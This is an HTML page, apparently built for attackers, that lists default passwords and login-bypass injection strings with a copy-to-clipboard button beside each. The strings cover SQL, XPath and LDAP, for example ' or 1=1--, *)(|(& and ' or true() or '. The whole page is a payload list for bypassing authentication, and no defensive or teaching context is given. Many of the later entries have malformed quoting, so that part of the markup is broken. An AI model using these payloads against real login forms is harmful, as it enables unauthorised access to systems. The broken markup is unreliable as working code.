<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Copy to Clipboard</title>
   
    <script>
        function copyToClipboard(text) {
            navigator.clipboard.writeText(text).then(() => {
                alert('Copied: ' + text);
            }).catch(err => {
                console.error('Failed to copy text: ', err);
            });
        }
    </script>
</head>
<body>
    <ul>
        <li><a href="#" onclick="copyToClipboard('admin')">admin</a></li>
        <li><a href="#" onclick="copyToClipboard('password')">password</a></li>
        <li><a href="#" onclick="copyToClipboard('1234')">1234</a></li>
        <li><a href="#" onclick="copyToClipboard('123456')">123456</a></li>
        <li><a href="#" onclick="copyToClipboard('root')">root</a></li>
        <li><a href="#" onclick="copyToClipboard('toor')">toor</a></li>
        <li><a href="#" onclick="copyToClipboard('test')">test</a></li>
        <li><a href="#" onclick="copyToClipboard('guest')">guest</a></li>
        <li><a href="#" onclick="copyToClipboard('\' or \'1\'=\'1')">' or '1'='1</a></li>
        <li><a href="#" onclick="copyToClipboard('\' or \'\'=\'')">' or ''='</a></li>
        <li><a href="#" onclick="copyToClipboard('\' or 1]%00')">' or 1]%00</a></li>
        <li><a href="#" onclick="copyToClipboard('\' or /* or \'')">' or /* or '</a></li>
        <li><a href="#" onclick="copyToClipboard('\' or \"a\" or \'')">' or "a" or '</a></li>
        <li><a href="#" onclick="copyToClipboard('\' or 1 or \'')">' or 1 or '</a></li>
        <li><a href="#" onclick="copyToClipboard('\' or true() or \'')">' or true() or '</a></li>
        <li><a href="#" onclick="copyToClipboard('\'or string-length(name(.))<10 or\'')">'or string-length(name(.))<10 or'</a></li>
        <li><a href="#" onclick="copyToClipboard('\'or contains(name,\'adm\') or\'')">'or contains(name,'adm') or'</a></li>
        <li><a href="#" onclick="copyToClipboard('\'or contains(.,\'adm\') or\'')">'or contains(.,'adm') or'</a></li>
        <li><a href="#" onclick="copyToClipboard('\'or position()=2 or\'')">'or position()=2 or'</a></li>
        <li><a href="#" onclick="copyToClipboard('admin\' or \'')">admin' or '</a></li>
        <li><a href="#" onclick="copyToClipboard('admin\' or \'1\'=\'2')">admin' or '1'='2</a></li>
        <li><a href="#" onclick="copyToClipboard('*')">*</a></li>
        <li><a href="#" onclick="copyToClipboard('*)(&')">*)(&</a></li>
        <li><a href="#" onclick="copyToClipboard('*)(|(&')">*)(|(&</a></li>
        <li><a href="#" onclick="copyToClipboard('pwd)')">pwd)</a></li>
        <li><a href="#" onclick="copyToClipboard('*)(|(*')">*)(|(*</a></li>
        <li><a href="#" onclick="copyToClipboard('*))%00')">*))%00</a></li>
        <li><a href="#" onclick="copyToClipboard('admin)(&)')">admin)(&)</a></li>
        <li><a href="#" onclick="copyToClipboard('pwd')">pwd</a></li>
        <li><a href="#" onclick="copyToClipboard('admin)(!(&(|')">admin)(!(&(|</a></li>
        <li><a href="#" onclick="copyToClipboard('pwd))')">pwd))</a></li>
        <li><a href="#" onclick="copyToClipboard('admin))(|(|')">admin))(|(|</a></li>
        <li><a href="#" onclick="copyToClipboard('1234')">1234</a></li>
        <li><a href="#" onclick="copyToClipboard('\'-\'')">'-'</a></li>
        <li><a href="#" onclick="copyToClipboard('\' \'')">' '</a></li>
        <li><a href="#" onclick="copyToClipboard('\'&\'')">'&'</a></li>
        <li><a href="#" onclick="copyToClipboard('\'^\'')">'^'</a></li>
        <li><a href="#" onclick="copyToClipboard('\'*\'')">'*'</a></li>
        <li><a href="#" onclick="copyToClipboard('\' or \'-\'')">' or ''-</a></li>
        <li><a href="#" onclick="copyToClipboard('\' or \' \'')">' or '' '</a></li>
        <li><a href="#" onclick="copyToClipboard('\' or \'&\'')">' or ''&</a></li>
        <li><a href="#" onclick="copyToClipboard('\' or \'^\'')">' or ''^</a></li>
        <li><a href="#" onclick="copyToClipboard('\' or \'*\'')">' or ''*</a></li>
        <li><a href="#" onclick="copyToClipboard('"-"')>"-"</a></li>
        <li><a href="#" onclick="copyToClipboard('" "')>" "</a></li>
        <li><a href="#" onclick="copyToClipboard('"&"')>"&"</a></li>
        <li><a href="#" onclick="copyToClipboard('^')>"^"</a></li>
        <li><a href="#" onclick="copyToClipboard('"-"')>"-"</a></li>
        <li><a href="#" onclick="copyToClipboard('" "')>" "</a></li>
        <li><a href="#" onclick="copyToClipboard('"&"')>"&"</a></li>
        <li><a href="#" onclick="copyToClipboard('"^"')>"^"</a></li>
        <li><a href="#" onclick="copyToClipboard('"*"')>"*"</a></li>
        <li><a href="#" onclick="copyToClipboard('" or ""-')>" or ""-</a></li>
        <li><a href="#" onclick="copyToClipboard('" or "" "')>" or "" "</a></li>
        <li><a href="#" onclick="copyToClipboard('" or ""&')>" or ""&</a></li>
        <li><a href="#" onclick="copyToClipboard('" or ""^')>" or ""^</a></li>
        <li><a href="#" onclick="copyToClipboard('" or ""*')>" or ""*</a></li>
        <li><a href="#" onclick="copyToClipboard('or true--')">or true--</a></li>
        <li><a href="#" onclick="copyToClipboard('" or true--')>" or true--</a></li>
        <li><a href="#" onclick="copyToClipboard('\' or true--')">' or true--</a></li>
        <li><a href="#" onclick="copyToClipboard('") or true--')>") or true--</a></li>
        <li><a href="#" onclick="copyToClipboard('\') or true--')>') or true--</a></li>
        <li><a href="#" onclick="copyToClipboard('\' or \'x\'=\'x')">' or 'x'='x</a></li>
        <li><a href="#" onclick="copyToClipboard('\') or (\'x\')=(\'x')>') or ('x')=('x</a></li>
        <li><a href="#" onclick="copyToClipboard('\')) or ((\'x\'))=((\'x')>')) or (('x'))=(('x</a></li>
        <li><a href="#" onclick="copyToClipboard('" or "x"="x')>" or "x"="x</a></li>
        <li><a href="#" onclick="copyToClipboard('") or ("x")=("x')>") or ("x")=("x</a></li>
        <li><a href="#" onclick="copyToClipboard('")) or ((\'x\'))=(\'x')>")) or (("x"))=(("x</a></li>
        <li><a href="#" onclick="copyToClipboard('or 1=1')">or 1=1</a></li>
        <li><a href="#" onclick="copyToClipboard('or 1=1--')">or 1=1--</a></li>
        <li><a href="#" onclick="copyToClipboard('\' or 1=1--')">' or 1=1--</a></li>
        <li><a href="#" onclick="copyToClipboard('or "1"="1"')>or "1"="1"</a></li>
        <li><a href="#" onclick="copyToClipboard('\'or "1"="1"')>'or "1"="1"</a></li>
        <li><a href="#" onclick="copyToClipboard('\') or ("1"="1")')>') or ("1"="1")</a></li>
        <li><a href="#" onclick="copyToClipboard('\') or 1=1--')>') or 1=1--</a></li>
        <li><a href="#" onclick="copyToClipboard('or ("a"="a")')>or ("a"="a")</a></li>
        <li><a href="#" onclick="copyToClipboard('\') or ("a"="a")--')>') or ("a"="a")--</a></li>
        <li><a href="#" onclick="copyToClipboard('") or ("a"="a")')>") or ("a"="a")</a></li>
        <li><a href="#" onclick="copyToClipboard('\') or ("a"="a")')>') or ("a"="a")</a></li>
        <li><a href="#" onclick="copyToClipboard('or 1=1--')>or 1=1--</a></li>
    </ul>
</body>
</html>
